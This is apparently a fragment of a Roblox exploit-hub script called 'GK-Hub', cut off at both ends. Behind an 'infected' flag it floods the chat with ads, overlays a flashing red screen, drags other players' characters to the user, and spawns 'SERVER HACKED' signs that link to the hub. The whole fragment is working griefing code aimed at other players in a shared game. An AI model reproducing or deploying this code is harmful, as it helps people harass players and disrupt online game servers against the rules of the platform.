local infected = false

	if infected then
		local screen = Instance.new("ScreenGui", game.CoreGui)
		screen.Name = ""

		local bg = Instance.new("Frame", screen)
		bg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		bg.Size = UDim2.new(1, 0, 1, 0)
		bg.BackgroundTransparency = 0.3

		local msg = Instance.new("TextLabel", screen)
		msg.Text = "JOIN TO GK-Hub USERS!"
		msg.Font = Enum.Font.Arcade
		msg.TextColor3 = Color3.new(1, 1, 1)
		msg.TextStrokeTransparency = 0
		msg.TextScaled = true
		msg.Size = UDim2.new(1, 0, 0.3, 0)
		msg.Position = UDim2.new(0, 0, 0.35, 0)
		msg.BackgroundTransparency = 1

		task.spawn(function()
			while infected do
				msg.Visible = not msg.Visible
				wait(0.3)
			end
			screen:Destroy()
		end)

		task.spawn(function()
			while infected do
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("GK-Hub TOP UNIVERSAL SCRIPT BY GooseKiller", "All")
				wait(1)
			end
		end)

		task.spawn(function()
			while infected do
				for _, player in pairs(game.Players:GetPlayers()) do
					if player ~= game.Players.LocalPlayer then
						local char = player.Character
						local myChar = game.Players.LocalPlayer.Character
						if char and myChar and myChar:FindFirstChild("HumanoidRootPart") and char:FindFirstChild("HumanoidRootPart") then
							char:MoveTo(myChar.HumanoidRootPart.Position + Vector3.new(math.random(-3, 3), 0, math.random(-3, 3)))
						end
					end
				end
				wait(5)
			end
		end)
      
		local function dropSign()
			local part = Instance.new("Part", workspace)
			part.Size = Vector3.new(50, 5, 10)
			part.Anchored = false
			part.Position = Vector3.new(0, 300, 0)
			part.BrickColor = BrickColor.new("Really red")
			local text = Instance.new("SurfaceGui", part)
			text.Face = Enum.NormalId.Top
			local label = Instance.new("TextLabel", text)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.Text = "SERVER HACKED BY GK-Hub (https://github.com/GooseKiller-Script/GK-Hub-By-GooseKiller-Universal-Roblox-Script)"
			label.TextScaled = true
			label.TextColor3 = Color3.new(1, 1, 1)
			label.BackgroundTransparency = 1
		end

		task.spawn(function()
			while infected do
				dropSign()
				wait(10)
			end
		end)
	end
end)
